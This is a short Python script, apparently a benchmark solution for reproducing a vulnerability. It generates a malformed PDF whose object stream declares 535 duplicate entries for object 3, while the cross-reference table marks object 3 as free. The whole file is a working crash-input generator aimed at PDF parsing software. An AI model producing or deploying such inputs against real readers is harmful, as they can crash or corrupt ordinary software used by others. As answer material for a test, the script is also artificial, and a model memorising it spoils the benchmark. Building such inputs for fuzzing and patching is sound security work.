class Solution:
    def solve(self, src_path: str) -> bytes:
        obj_content = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\n"
        len_obj = len(obj_content)
        N = 535
        len_headers = N * 8
        for _ in range(20):
            offsets = [len_headers + i * len_obj for i in range(N)]
            len_headers_new = sum(len(f"3 {off}\n") for off in offsets)
            if len_headers_new == len_headers:
                break
            len_headers = len_headers_new
        offsets = [len_headers + i * len_obj for i in range(N)]
        header_bytes = b''.join(f"3 {off}\n".encode('ascii') for off in offsets)
        objects_bytes = obj_content * N
        stream_bytes = header_bytes + objects_bytes
        first = len_headers
        objstm_dict = f"<< /Type /ObjStm /N {N} /First {first} >>\n".encode('ascii')
        obj_header = b"4 0 obj\n"
        stream_start = b"stream\n"
        stream_end = b"endstream\n"
        obj_end = b"endobj\n"
        objstm_part = obj_header + objstm_dict + stream_start + stream_bytes + stream_end + obj_end
        header_pdf = b"%PDF-1.5\n"
        catalog = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        pages = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        pos1 = len(header_pdf)
        pos2 = pos1 + len(catalog)
        pos4 = pos2 + len(pages)
        pos_xref = pos4 + len(objstm_part)
        xref_entries = [
            "0000000000 65535 f",
            f"{pos1:010d} 00000 n",
            f"{pos2:010d} 00000 n",
            "0000000000 65535 f",
            f"{pos4:010d} 00000 n"
        ]
        xref_lines = [b"xref", b"0 5"] + [e.encode('ascii') for e in xref_entries] + [
            b"trailer",
            b"<< /Size 5 /Root 1 0 R >>",
            b"startxref",
            str(pos_xref).encode('ascii'),
            b"%%EOF"
        ]
        xref_bytes = b"\n".join(xref_lines) + b"\n"
        full_parts = [
            header_pdf,
            catalog,
            pages,
            objstm_part,
            xref_bytes
        ]
        return b"".join(full_parts)
